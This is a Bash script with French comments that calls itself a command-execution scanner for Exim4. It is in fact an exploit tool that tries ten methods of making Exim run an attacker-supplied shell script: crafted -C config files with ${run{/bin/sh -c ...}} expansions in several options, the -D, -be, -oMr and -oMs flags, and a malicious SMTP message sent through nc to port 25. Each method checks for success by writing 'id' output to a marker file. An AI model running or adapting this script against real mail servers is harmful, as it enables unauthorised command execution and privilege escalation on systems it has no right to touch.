#!/bin/bash

echo "Scanner d'exécution de commande pour Exim4 (version Bash)"
echo "======================================================"

# Créer un fichier témoin
MARKER_FILE="/tmp/exim_test_marker"
MARKER_CONTENT="Exim exploit test $(date)"

# Créer un script de test
SCRIPT_PATH="/tmp/exim_test_script.sh"
cat > $SCRIPT_PATH << EOF
#!/bin/bash
echo "$MARKER_CONTENT" > $MARKER_FILE
chmod 777 $MARKER_FILE
id >> $MARKER_FILE
EOF
chmod +x $SCRIPT_PATH

echo "[*] Fichier témoin: $MARKER_FILE"
echo "[*] Script de test: $SCRIPT_PATH"

# Fonction pour vérifier si l'exploitation a réussi
check_success() {
    if [ -f "$MARKER_FILE" ]; then
        echo "[!] SUCCÈS! Le fichier témoin a été créé: $MARKER_FILE"
        echo "[+] Contenu du fichier témoin:"
        cat "$MARKER_FILE"
        rm -f "$MARKER_FILE"
        return 0
    else
        echo "[-] Échec de la méthode"
        return 1
    fi
}

# Méthode 1: Configuration simple avec ${run{...}}
echo -e "\n[+] Test de la méthode 1: Configuration simple avec \${run{...}}"
CONFIG_PATH="/tmp/exim_exploit1.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 2: Configuration avec keep_environment
echo -e "\n[+] Test de la méthode 2: Configuration avec keep_environment"
CONFIG_PATH="/tmp/exim_exploit2.conf"
cat > $CONFIG_PATH << EOF
keep_environment = SHELL=/bin/sh:PATH=/bin:/usr/bin
primary_hostname = \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 3: Configuration avec $(run...)
echo -e "\n[+] Test de la méthode 3: Configuration avec \$(run...)"
CONFIG_PATH="/tmp/exim_exploit3.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = \$(run $SCRIPT_PATH)
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 4: SMTP avec ${run{...}}
echo -e "\n[+] Test de la méthode 4: SMTP avec \${run{...}}"
(
echo "HELO localhost"
echo "MAIL FROM: <>"
echo "RCPT TO: <c2-web@localhost>"
echo "DATA"
echo "From: root@localhost"
echo "To: c2-web@localhost"
echo "Subject: Exploit"
echo ""
echo "\${run{/bin/sh -c \"$SCRIPT_PATH\"}}"
echo "."
echo "QUIT"
) | nc localhost 25
sleep 1
check_success

# Méthode 5: Configuration avec tls_certificate
echo -e "\n[+] Test de la méthode 5: Configuration avec tls_certificate"
CONFIG_PATH="/tmp/exim_exploit5.conf"
cat > $CONFIG_PATH << EOF
tls_certificate = \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 6: Configuration avec system_filter
echo -e "\n[+] Test de la méthode 6: Configuration avec system_filter"
CONFIG_PATH="/tmp/exim_exploit6.conf"
cat > $CONFIG_PATH << EOF
system_filter = \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 7: Exim -D option
echo -e "\n[+] Test de la méthode 7: Exim -D option"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C/dev/null -D'({\${run{/bin/sh -c \"$SCRIPT_PATH\"}}}})'"
/usr/sbin/exim4 -C/dev/null -D'({\${run{/bin/sh -c "$SCRIPT_PATH"}}}})'
check_success

# Méthode 8: Exim -be option
echo -e "\n[+] Test de la méthode 8: Exim -be option"
echo "[DEBUG] Exécution de la commande: echo '\${run{/bin/sh -c \"$SCRIPT_PATH\"}}' | /usr/sbin/exim4 -be"
echo '\${run{/bin/sh -c "$SCRIPT_PATH"}}' | /usr/sbin/exim4 -be
check_success

# Méthode 9: Exim -oMr option
echo -e "\n[+] Test de la méthode 9: Exim -oMr option"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -oMr$SCRIPT_PATH"
/usr/sbin/exim4 -oMr$SCRIPT_PATH
check_success

# Méthode 10: Exim -oMs option
echo -e "\n[+] Test de la méthode 10: Exim -oMs option"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -oMs$SCRIPT_PATH"
/usr/sbin/exim4 -oMs$SCRIPT_PATH
check_success

echo -e "\n[*] Tests terminés."
